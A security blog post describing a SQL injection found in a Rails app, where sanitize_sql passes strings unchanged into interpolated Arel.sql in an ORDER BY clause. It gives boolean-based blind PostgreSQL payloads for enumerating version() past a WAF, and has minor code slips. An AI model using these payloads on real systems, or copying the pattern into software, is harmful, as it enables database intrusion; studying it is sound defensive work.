---
layout: post
title: Ruby on Rails SQL Sanitization
categories: [Rails, ActiveRecord, SQL Injection]
description: Leveraging sanitization issues in Rails ActiveRecord for SQL injection
keywords: ActiveRecord, SQLi, Ruby
mermaid: false
sequence: false
flow: false
mathjax: false
mindmap: false
mindmap2: false
---

# Ruby on Rails SQL Sanitization

*Special thanks to my bossman [Jeff Thomas](https://jeffhacks.com/) in the research regarding this issue.*

I recently had the opportunity to review some Ruby on Rails (RoR) code as part of grey box testing (dynamic testing + source code analysis). The code base used Active Record, which is an Object Relational Mapping (ORM) framework for Ruby and RoR. What this means put simply, is that instead of using direct/raw SQL queries to interact with the relational database management system, we can use objects instead.

## The Basics

Class definitions for a User model can be defined as such which will map the User table to this model:

```ruby
class User < ActiveRecord::Base
class Book < ApplicationRecord // ApplicationRecord also serves as the base class to interact with the database
```

The models can inherit additional logic, associations etc such as the following:

```ruby
class Admin < ApplicationRecord
  belongs_to :user // each Admin record belongs to a User
  has_many :permissions // each Admin can have multiple permissions

  scope :create_new_user, -> { ...queries... } // creates a new method call for the Admin model as a shortcut to a query 
```

We can then call the various attributes of the User class to interact with it. For example:

```ruby
User.new(...) // creating a new entry
User.save // saving the entry to the database

User.find(id) // find an entry based off an id
User.where(...) // return results based off a condition
```

This is just an extremely brief overview of Active Record to set the scene, to understand more please visit [here](https://guides.rubyonrails.org/active_record_basics.html).

## The Interesting

Sometimes complicated queries are used to extract the appropriate entries from the relational database. If they are engineered inappropriately, the Active Record query may accept unsanitized or insufficiently sanitized input. Take this for example:

```ruby
sanitised_input = sanitize_sql(unsanitized_string_input)
rel = joins(a).where(b).order(Arel.sql("position(c::text in '#{sanitized_input}')"))
result = rel.first
```

Let's break this down:

Our `unsanitized_string_input` is sanitized using the Ruby on Rails Active Record input sanitization method - `sanitize_sql`. This method is shown [here](https://api.rubyonrails.org/v7.1.3.4/classes/ActiveRecord/Sanitization/ClassMethods.html#method-i-sanitize_sql), but it is effectively an alias for [sanitize_sql_for_conditions](https://api.rubyonrails.org/v7.1.3.4/classes/ActiveRecord/Sanitization/ClassMethods.html#method-i-sanitize_sql_for_conditions).

The input is added to an SQL query method, which is used to retrieve the first record that matches these conditions (`rel.first`). The conditions are:
  - joins(a): SQL JOIN clause to attach two tables
  - where(b): SQL WHERE clause
  - order(...): SQL ORDERBY clause
  - Arel.sql: allows the insertion of raw SQL clauses for more complex queries, but is generally done so in a safe manner
  - `position(c::text in '#{sanitized_input}')`: The SQL clause to append after the ORDERBY. This is a PostgreSQL position function which attempts to determine the position of the sanitized_input in the 'c' column, cast as text

So where is the issue? When we observe that the raw SQL input accepts `#{sanitized_input}`, this is actually string interpolation, and the user input is directly added to the clause. If the input is unsanitized or insufficiently sanitized, this can lead to SQL injection.

As it turns out, and as provided by this [rails issue here](https://github.com/rails/rails/issues/46053), the `sanitize_sql` method serves as a passthrough for everything except arrays. If we pass a string to the sanitization function, it would ignore it and pass it straight to string interpolation, leading to an SQL injection issue. This is shown in the Rails Active Record as shown:

<img width="911" alt="image" src="https://github.com/user-attachments/assets/c7063a10-1147-467d-a820-777ddbbb9d63">

## The Exploitation

When attempting to exploit this issue on the target web application, we noted that they used a Cloudflare WAF which blocked the majority of payloads ( provided by SQLMap, even with the use of tamper scripts, or payload modification as per my [previous blog](https://qwutony.github.io/2024/04/03/customising-sqlmap/). Thus the initial proof of concept had to be manually crafted.

We observed that only a boolean-based SQL injection was possible, and the application would either respond with a 500 error if the SQL query is broken, such as by injecting a single quote, or returned a 404 with an even number of quotes.

```
') + ('0 // 500
'') + ('0 // 404
```

As we know that the injection location occurs after the ORDERBY clause, we need to insert our payload in either the OFFSET or the LIMIT clause to respect the order of clauses, the order being:

1. SELECT
2. FROM
3. JOIN
4. WHERE
5. GROUP BY
6. HAVING
7. ORDER BY <-- You are here.
8. OFFSET
9. LIMIT

We can then use another position statement (PostgreSQL specific) to attempt to enumerate the database. For example:

```SQL
') offset (case when (select position('O' in (select version()))) = '1' then 0 else -1 end) + ('0 // If the first character is 'O' in version(), then OFFSET 0

') offset (case when (select position('P' in (select version()))) = '1' then 0 else -1 end) + ('0 // If the first character is 'P' in version(), then OFFSET -1, which results in an error (ERROR: OFFSET must not be negative)

') offset (case when (select position('Po' in (select version()))) = '2' then 0 else -1 end) + ('0 // Can append the second character to the original clause
```

## Resources:
  - [https://guides.rubyonrails.org/active_record_basics.html](https://guides.rubyonrails.org/active_record_basics.html)
  - [https://jeffhacks.com/](https://jeffhacks.com/)
  - [https://github.com/rails/rails/issues/46053](https://github.com/rails/rails/issues/46053)
  - [https://api.rubyonrails.org/v7.1.3.4/classes/ActiveRecord/Sanitization/ClassMethods.html#method-i-sanitize_sql](https://api.rubyonrails.org/v7.1.3.4/classes/ActiveRecord/Sanitization/ClassMethods.html#method-i-sanitize_sql)
  - [https://api.rubyonrails.org/v7.1.3.4/classes/ActiveRecord/Sanitization/ClassMethods.html#method-i-sanitize_sql_for_conditions](https://api.rubyonrails.org/v7.1.3.4/classes/ActiveRecord/Sanitization/ClassMethods.html#method-i-sanitize_sql_for_conditions)
